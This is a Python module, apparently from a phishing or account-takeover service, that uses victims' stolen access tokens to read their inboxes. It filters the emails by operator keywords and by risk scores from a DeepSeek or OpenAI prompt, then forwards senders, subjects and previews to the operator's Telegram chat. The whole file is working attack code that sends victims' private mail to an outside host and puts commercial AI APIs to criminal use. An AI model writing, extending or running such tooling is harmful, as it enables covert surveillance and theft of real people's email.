# app/engine/scanner.py
import re
import logging
import requests
from datetime import datetime, timedelta
from app.extensions import db
from app.models import Victim, KeywordRule, Tenant, Campaign
from app.engine.harvester import EmailHarvester
from app.utils.notify import send_telegram

def scan_tenant_emails(tenant):
    """Scan all victims of a tenant for new emails and process with configured alert mode."""
    if not tenant.telegram_bot_token or not tenant.telegram_chat_id:
        return  # No Telegram configured, skip

    victims = Victim.query.join(Campaign).filter(
        Campaign.tenant_id == tenant.id,
        Victim.access_token.isnot(None)
    ).all()
    if not victims:
        return

    keywords = [kw.keyword.lower() for kw in tenant.keywords]
    alert_mode = tenant.alert_mode or 'ai'

    for victim in victims:
        try:
            harvester = EmailHarvester(victim.access_token)
            # Fetch recent emails (last 2 hours to avoid duplicates; we'll process all and check later)
            # For simplicity, fetch last 50 emails (we can enhance with last_scan timestamp)
            emails = harvester.harvest_inbox(limit=50)
            for email in emails:
                subject = email.get('subject', '')
                body_preview = email.get('bodyPreview', '')
                sender = email.get('sender', {}).get('emailAddress', {}).get('address', '')

                # ---- Keyword check ----
                keyword_match = False
                if alert_mode in ('keyword', 'both'):
                    for kw in keywords:
                        if kw in subject.lower() or kw in body_preview.lower():
                            keyword_match = True
                            msg = (
                                f"🔔 **Keyword Alert**\n"
                                f"**Keyword:** {kw}\n"
                                f"**From:** {sender}\n"
                                f"**Subject:** {subject}\n"
                                f"**Preview:** {body_preview[:200]}..."
                            )
                            send_telegram(tenant.telegram_bot_token, tenant.telegram_chat_id, msg)
                            break  # one alert per email

                # ---- AI check ----
                if alert_mode in ('ai', 'both') and tenant.ai_api_key:
                    risk_score = analyze_email_with_ai(subject, body_preview, tenant)
                    if risk_score is not None and risk_score >= tenant.ai_risk_threshold:
                        msg = (
                            f"🤖 **AI Alert**\n"
                            f"**Risk Score:** {risk_score} (threshold {tenant.ai_risk_threshold})\n"
                            f"**From:** {sender}\n"
                            f"**Subject:** {subject}\n"
                            f"**Preview:** {body_preview[:200]}..."
                        )
                        send_telegram(tenant.telegram_bot_token, tenant.telegram_chat_id, msg)

        except Exception as e:
            logging.error(f"Error scanning victim {victim.id}: {e}")


def analyze_email_with_ai(subject, body, tenant):
    """Call AI API to analyze email content and return risk score (0-100)."""
    provider = tenant.ai_provider or 'deepseek'
    api_key = tenant.ai_api_key
    model = tenant.ai_model or 'deepseek-chat'
    if not api_key:
        return None

    content = f"Subject: {subject}\nBody: {body[:1000]}"
    prompt = (
        "You are a security analyst. Analyze the following email and return a risk score from 0 to 100 "
        "based on how likely it is a phishing or malicious email. Only respond with a number between 0 and 100, nothing else.\n\n"
        f"Email:\n{content}"
    )

    try:
        if provider == 'deepseek':
            url = "https://api.deepseek.com/v1/chat/completions"
            headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
            data = {
                "model": model,
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.3,
                "max_tokens": 10
            }
            resp = requests.post(url, headers=headers, json=data, timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                score_text = result['choices'][0]['message']['content'].strip()
                numbers = re.findall(r'\d+', score_text)
                if numbers:
                    score = int(numbers[0])
                    return min(max(score, 0), 100)
            return None
        elif provider == 'openai':
            url = "https://api.openai.com/v1/chat/completions"
            headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
            data = {
                "model": model or "gpt-3.5-turbo",
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.3,
                "max_tokens": 10
            }
            resp = requests.post(url, headers=headers, json=data, timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                score_text = result['choices'][0]['message']['content'].strip()
                numbers = re.findall(r'\d+', score_text)
                if numbers:
                    score = int(numbers[0])
                    return min(max(score, 0), 100)
            return None
        else:
            return None
    except Exception as e:
        logging.error(f"AI API error: {e}")
        return None